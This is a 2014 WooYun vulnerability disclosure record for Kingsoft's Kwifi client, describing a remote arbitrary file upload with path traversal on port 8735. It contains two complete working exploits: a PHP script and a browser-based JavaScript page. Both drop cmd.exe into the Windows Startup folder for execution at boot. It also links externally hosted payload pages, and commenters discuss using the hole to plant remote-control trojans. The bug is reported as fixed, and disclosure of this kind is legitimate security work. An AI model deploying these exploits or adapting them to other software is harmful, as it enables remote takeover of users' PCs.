{"id": 62, "wybug_id": "wooyun-2014-072394", "wybug_title": "金山某客户端应用远程文件上传导致命令执行，突破内外网控制PC机", "wybug_corp": "金山网络", "wybug_author": "itleaf", "wybug_date": "2014-08-14 18:01", "wybug_open_date": "2014-11-12 18:02", "wybug_type": "远程代码执行", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-12：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 闪电有没有？ 详细说明：  漏洞程序：Kwifi V4.0.140813 猎豹wifi最新版本测试环境：Windows 7 64bitKwifi V4.0.140813Firefox 31.0Chrome 36.0.1985.143 m漏洞详情：当猎豹wifi运行后会向外网开放8735端口（运行web），而其某接口存在漏洞导致任意文件上传，从而导致pc机沦陷。http://target:8735/tool/#uploadhttp://target:8735/api/replypic 存在漏洞导致任意文件上传漏洞危害：默认装C盘 可以实现挂马，指定入侵，拓展大企业内网监控pc机等；部分测试环境默认安装在D盘（wooyun工作人员测试时出现，我测试时无论是官网最新版本还是百度下载的猎豹wifi都装在C盘）；   漏洞证明：  当kwifi外网环境时：\n<?php  /** * Created by itleaf * Date: 2014-08-14 * Name: Kwifi V4.0.140813 Remote File Upload Exploit * Blog: http://itleaf.duapp.com **/function getIP(){\tif (isset($_SERVER)) {\t\tif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\t\t$realip = $_SERVER['HTTP_X_FORWARDED_FOR'];\t} elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {\t\t$realip = $_SERVER['HTTP_CLIENT_IP'];\t} else {\t\t$realip = $_SERVER['REMOTE_ADDR'];\t}\t} else {\t\tif (getenv(\"HTTP_X_FORWARDED_FOR\")) {\t\t$realip = getenv( \"HTTP_X_FORWARDED_FOR\");\t} elseif (getenv(\"HTTP_CLIENT_IP\")) {\t\t$realip = getenv(\"HTTP_CLIENT_IP\");\t} else {\t\t$realip = getenv(\"REMOTE_ADDR\");\t\t}\t}\treturn $realip;}\t$ip=$_GET[\"ip\"];\t$ch = curl_init();     $post=array('filename' => '@'.realpath('cmd.exe'));  //POST提交内容      $url = \"http://\".$ip.\":8735/api/replypic?name=../../../../../../ProgramData/Microsoft/Windows/Start%20Menu/Programs/Startup/cmd.exe&size=345088\"; //上传地址     // $url = \"http://\".getIP()\":8735/api/replypic?name=../../../../../../ProgramData/Microsoft/Windows/Start%20Menu/Programs/Startup/cmd.exe&size=345088\"; //上传地址           curl_setopt($ch, CURLOPT_URL, $url);//URL  \tcurl_setopt($ch, CURLOPT_REFERER, \"http://\".$ip.\":8735/tool/\");    curl_setopt($ch, CURLOPT_POST, 1);  //模拟POST      curl_setopt($ch, CURLOPT_POSTFIELDS, $post);//POST内容  \tcurl_exec($ch);      curl_close($ch);  \t//echo getIP();?>\n当kwifi为内网环境时：firefox 和google chrome下有效\n<!DOCTYPE html> \t<html> \t<head>\t<title>Kwifi Remote File Upload Exploit</title>\t<meta charset=utf-8 />\t<link href='css.css' rel='stylesheet' type='text/css'> \t<script src=\"jquery.min.js\" type=\"text/javascript\"></script>\t<style>\tbody {background: #333; color: #eee; font-family: 'Inconsolata', Verdana, sans-serif;}\ta:link {color: green; }\ta:visited {color: darkgreen;}\t</style>\t</head>\t<body>\t<h1>Kwifi V4.0.140813 Remote File Upload Exploit</h1>\t\t<!-- <h2>Step 2</h2>\t<button type=\"button\" id=\"upload\" onclick=\"start()\"><font size=\"+2\">Let's have some fun!</font></button> -->\t<script>\tvar logUrl = 'http://192.168.1.103:8735/api/replypic?name=../../../../../../ProgramData/Microsoft/Windows/Start%20Menu/Programs/Startup/cmd.exe&size=345088';\tfunction byteValue(x) {    return x.charCodeAt(0) & 0xff;\t}\tfunction toBytes(datastr) {    var ords = Array.prototype.map.call(datastr, byteValue);    var ui8a = new Uint8Array(ords);    return ui8a.buffer;\t}\tif (typeof XMLHttpRequest.prototype.sendAsBinary == 'undefined' && Uint8Array) {\tXMLHttpRequest.prototype.sendAsBinary = function(datastr) {\tthis.send(toBytes(datastr));\t}\t}\tfunction fileUpload(fileData, fileName) {\tvar fileSize = fileData.length,\tboundary = \"9849436581144108930470211272\",\turi = logUrl,\txhr = new XMLHttpRequest();\t\tvar fileFieldName = \"filedata\";\t\txhr.open(\"POST\", uri, true);\txhr.setRequestHeader(\"Content-Type\", \"multipart/form-data, boundary=\"+boundary); // simulate a file MIME POST request.\txhr.setRequestHeader(\"Content-Length\", fileSize);\txhr.withCredentials = \"true\";\t\txhr.onreadystatechange = function() {   \tif (xhr.readyState == 4) {\tif ((xhr.status >= 200 && xhr.status <= 200) || xhr.status == 304) {\t\tif (xhr.responseText != \"\") {\talert(JSON.parse(xhr.responseText).msg); // display response.\t}\t} else if (xhr.status == 0) {\t$(\"#goto\").show();\t}\t}\t}\t\tvar body = \"\";\tbody += addFileField(fileFieldName, fileData, fileName, boundary);\tbody += \"--\" + boundary + \"--\";\txhr.sendAsBinary(body);\treturn true;\t}\tfunction addField(name, value, boundary) {\tvar c = \"--\" + boundary + \"\\r\\n\"\tc += \"Content-Disposition: form-data; name='\" + name + \"'\\r\\n\\r\\n\";\tc += value + \"\\r\\n\";\treturn c;\t}\tfunction addFileField(name, value, filename, boundary) {    var c = \"--\" + boundary + \"\\r\\n\"    c += \"Content-Disposition: form-data; name='\" + name + \"'; filename='\" + filename + \"'\\r\\n\";    c += \"Content-Type: application/octet-stream\\r\\n\\r\\n\";    c += value + \"\\r\\n\";    return c;\t\t}\tfunction load_binary_resource(url) {\tvar req = new XMLHttpRequest();\treq.open('GET', url, false);\t//XHR binary charset opt by Marcus Granado 2006 [http://mgran.blogspot.com]\treq.overrideMimeType('text/plain; charset=x-user-defined');\treq.send(null);\tif (req.status != 200) return '';\tvar bytes = Array.prototype.map.call(req.responseText, byteValue);\ttry{\treturn String.fromCharCode.apply(this,bytes);\t}catch(e){\treturn req.responseText;\t}\t\t}\tvar start = function() {\tvar c = load_binary_resource('cmd.exe');\tfileUpload(c, 'cmd.exe');\t};\tstart();\t</script>\t</div>\t<div id=\"goto\" style=\"display:none\">\t<h2>Well Done</h2>\t\t</div>\t</body>\t</html>\n   修复方案：  视频：http://qin1u.qiniudn.com/kwifi.wmv演示个cmd，上马过金山等也是可以的~下面给一个通用型测试payload：若安装到c盘，则开启wifi后访问下述链接，安装cmd.exe程序到系统启动项http://xssae.sinaapp.com/kwifi/2.html若安装到d盘，则开启wifi后访问下述链接，安装cmd.exe程序到d盘根目录http://xssae.sinaapp.com/kwifi/3.html   版权声明：转载请注明来源 itleaf@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-08-14 19:53 厂商回复： 非常感谢您的提交 最新状态： 2014-11-12：已经修复 2014-11-12：漏洞已修复  ", "replys": "漏洞评价：\n评论\n     2014-08-14 18:12 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  好屌的样子。    \n     2014-08-14 18:13 |    \t\titleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:17        )\t\t \n  @zeracker 我想要闪电    \n     2014-08-14 18:31 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @itleaf 雷劈了    \n     2014-08-14 18:34 |    \t\titleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:17        )\t\t \n  @疯狗 劈得好啊    \n     2014-08-14 18:38 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @itleaf 有票了    \n     2014-08-14 18:50 |    \t\t安然意境 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:79        | 无论是你的事业还是你的个人，可能走的过程...)\t\t \n  闪电    \n     2014-08-14 19:04 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  关注    \n     2014-08-14 19:49 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  关注，膜拜    \n     2014-08-14 21:09 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  赞厂商    \n     2014-08-14 21:23 |    \t\titleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:17        )\t\t \n  @xsser 怎么说    \n     2014-08-15 13:08 |    \t\titleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:17        )\t\t \n  厂商最新版已经修复，百度搜索下载任有效，安装到D盘，请删除D盘Program Files (x86)文件夹或在虚拟机里测试，win7 64bit firefox chrome测试成功，exp自行按需更改    \n     2014-11-12 19:06 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  。。不明白CMD哪来的你说的上传也没见上传CMD啊    \n     2014-11-12 19:27 |    \t\titleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:17        )\t\t \n  @大白菜 cmd是远程调用的     \n     2014-11-12 19:42 |    \t\t萌萌哒-花粉 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:5        | 多乌云 多美女 花粉 顾名思义 就是校花班花...)\t\t \n  金山 我喜欢这厂商 虽然和我想不不一样 但是的确很刁 值得学习    \n     2014-11-12 20:27 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  @大白菜在script有下面这段代码 var start = function() {\tvar c = load_binary_resource('cmd.exe');\tfileUpload(c, 'cmd.exe');\t};\tstart();先用ajax的方式远程读取cmd.exe再上传cmd.exe地址http://xssae.sinaapp.com/kwifi/cmd.exe    \n     2014-11-13 00:02 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  @1c3z ...那能执行添加用户的命令吗？或者开3389  或者执行远程木马    \n     2014-11-13 11:08 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  @大白菜 安装cmd.exe程序到系统启动项ProgramData/Microsoft/Windows/Start%20Menu/Programs/Startup开机自启动    \n     2014-11-13 14:37 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  @1c3z 。。。能安装cmd远控木马吗？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}